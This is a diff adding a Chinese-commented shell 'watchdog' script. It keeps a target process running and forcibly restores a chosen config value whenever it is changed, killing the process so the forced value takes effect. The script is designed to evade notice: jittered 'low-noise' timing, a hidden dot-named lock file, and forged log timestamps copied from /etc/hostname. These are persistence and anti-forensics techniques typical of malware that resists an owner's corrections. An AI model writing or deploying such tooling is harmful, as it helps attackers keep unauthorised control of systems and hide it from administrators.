@@ -1,0 +1,68 @@
+#!/bin/sh
+# ============================================================
+# FGUARD · WATCHDOG — 快频保活 + 配置锚定夺回
+# 职责：① 目标进程 30s 级保活  ② 锚定值守护（偏差即夺回）
+# 约束：低噪（24~36s 抖动）、flock 单例、日志 mtime 归一
+# ============================================================
+BASE="$(cd "$(dirname "$0")" && pwd)"
+[ -f "$BASE/fguard.conf" ] && . "$BASE/fguard.conf"
+TAG="${TAG:-fguard}"
+LOG="$BASE/state.log"
+LOC="/var/lock/.${TAG}-wd.lock"
+
+mkdir -p "$(dirname "$LOC")" 2>/dev/null
+LOCKED=0
+exec 201>"$LOC" 2>/dev/null && { command -v flock >/dev/null 2>&1 && flock -n 201 2>/dev/null && LOCKED=1; }
+if [ "$LOCKED" != "1" ]; then
+    PIDF="${LOC}.pid"
+    if [ -f "$PIDF" ] && kill -0 "$(cat "$PIDF" 2>/dev/null)" 2>/dev/null; then exit 0; fi
+    printf '%s' "$$" > "$PIDF" 2>/dev/null
+fi
+
+note() { echo "$(date '+%F %T') notice: $*" >> "$LOG" 2>/dev/null; touch -r "${MREF:-/etc/hostname}" "$LOG" 2>/dev/null; }
+
+# ---- 锚定值夺回（覆盖主配置 + 还原全部备份副本） ----
+restore_anchor() {
+    [ -z "$ANCHOR_KEY" ] && return
+    [ -z "$ANCHOR_FILE" ] && return
+    [ -f "$ANCHOR_FILE" ] || return
+    cur=$(sed -n "s/^[^=]*${ANCHOR_KEY}=//p" "$ANCHOR_FILE" 2>/dev/null | head -1)
+    case "$cur" in
+        "$ANCHOR_VAL"*) : ;;
+        *)
+            if grep -q "^[^=]*${ANCHOR_KEY}=" "$ANCHOR_FILE" 2>/dev/null; then
+                sed -i "s|^[^=]*${ANCHOR_KEY}=.*|${ANCHOR_KEY}=${ANCHOR_VAL}|" "$ANCHOR_FILE" 2>/dev/null
+            else
+                printf '%s=%s\n' "${ANCHOR_KEY}" "${ANCHOR_VAL}" >> "$ANCHOR_FILE"
+            fi
+            note "anchor-restored"
+            [ -n "$TARGET_PROC" ] && pkill -9 -f "$TARGET_PROC" 2>/dev/null
+            ;;
+    esac
+}
+
+# ---- 目标进程保活（防双开：先查后拉） ----
+keepalive() {
+    [ -z "$TARGET_PROC" ] && return
+    FIRST=$(printf '%s' "$TARGET_PROC" | cut -c1)
+    REST=$(printf '%s' "$TARGET_PROC" | cut -c2-)
+    if ! ps -eo args 2>/dev/null | grep -q "[$FIRST]$REST"; then
+        if [ -n "$TARGET_CMD" ]; then
+            (cd "$TARGET_DIR" 2>/dev/null || cd "$BASE"; set -a; [ -n "$TARGET_ENV" ] && [ -f "$TARGET_ENV" ] && . "$TARGET_ENV"; set +a; setsid nohup sh -c "$TARGET_CMD" >/dev/null 2>&1 &)
+            note "target-relaunched"
+        fi
+    fi
+}
+
+check() { restore_anchor; keepalive; }
+
+if [ "$1" = "--loop" ]; then
+    while :; do
+        check
+        J=$(awk 'BEGIN{srand();print int(rand()*12)}' 2>/dev/null || echo 6)
+        sleep $((24 + J))
+    done
+else
+    check
+fi
+exit 0
